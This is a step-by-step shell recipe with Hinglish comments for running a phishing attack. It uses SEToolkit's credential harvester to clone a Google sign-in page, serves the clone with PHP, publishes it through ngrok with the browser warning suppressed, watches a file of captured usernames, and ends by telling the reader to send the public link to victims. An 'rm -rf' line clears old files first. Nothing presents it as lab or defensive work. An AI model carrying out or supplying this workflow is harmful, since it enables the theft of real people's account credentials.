# ========================================
# STEP BY STEP - SETOOLKIT
# ========================================

# Step 1: Purani files delete karo
rm -rf /root/phishing_page/*

# Step 2: SEToolkit run karo
sudo setoolkit
# Menu: 1 → 2 → 3 → 1 → 2 (Google template)
# IP: 0.0.0.0
# Jab server start ho jaye → Ctrl+C

# Step 3: Files copy karo
cp -r /var/www/html/* /root/phishing_page/

# Step 4: PHP server start (Terminal 1)
cd /root/phishing_page
php -S 0.0.0.0:8080

# Step 5: Ngrok start (Terminal 2 - Naya terminal)
ngrok http 8080 --request-header-add "ngrok-skip-browser-warning: true"

# Step 6: Credentials monitor (Terminal 3 - Optional)
tail -f /root/phishing_page/usernames.txt

# Step 7: Link send karo
# https://reformist-handed-trapping.ngrok-free.dev